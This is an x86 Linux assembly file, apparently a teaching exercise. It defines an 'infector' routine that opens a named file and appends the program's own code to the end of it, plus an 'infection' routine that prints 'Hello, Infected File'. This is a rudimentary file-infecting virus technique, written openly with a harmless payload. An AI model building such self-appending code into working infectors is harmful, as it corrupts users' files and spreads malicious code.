OPEN equ 5
CLOSE equ 6
LSEEK equ 19
STDOUT equ 1
WRITE equ 4
FILE_PREMISSON equ 0x700
SEEK_END equ 2

section .data
    msg: db "Hello, Infected File", 10, 0
    msgSize: equ $ - msg
    fd: dd 0

section .text
    global _start
    global system_call
    extern main
    global infection
    global infector
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

    
code_start:
    infection:
        push ebp             ; Save caller state
        mov ebp, esp
        pushad               ; Save state
        mov eax, [ebp+8]     ; Get argument
        
        shr ebx, 1
		jc end_infection
		jmp isEven
		
		isEven:
            mov eax, WRITE
            mov ebx, STDOUT
            mov ecx, msg
            mov edx, msgSize
            int 0x80
        end_infection:
            popad
            pop ebp
            ret
    infector:
        push ebp
        mov ebp, esp
        pushad
        mov ebp, [ebp+8]
        
        ; OPEN
        mov eax, OPEN
        mov ebx, ebp
        mov ecx, 0x101
        mov edx, FILE_PREMISSON
        int 0x80
        
        ; SAFE FILE DESCRIPTOR
        mov [fd], eax
        
        ; MOVE POINTER TO ENDOF FILE
        mov eax, LSEEK
        mov ebx, [fd]
        mov ecx, 0      ; OFFSET
        mov edx, SEEK_END
        int 0x80
        
        ; WRITE
        mov eax, WRITE
        mov ebx, [fd]
        mov ecx, code_start
        mov edx, code_end-code_start
        int 0x80
        
        ; CLOSE
        mov eax, CLOSE
        mov ebx, [fd]
        int 0x80
        
        popad
        pop ebp
        ret

code_end:
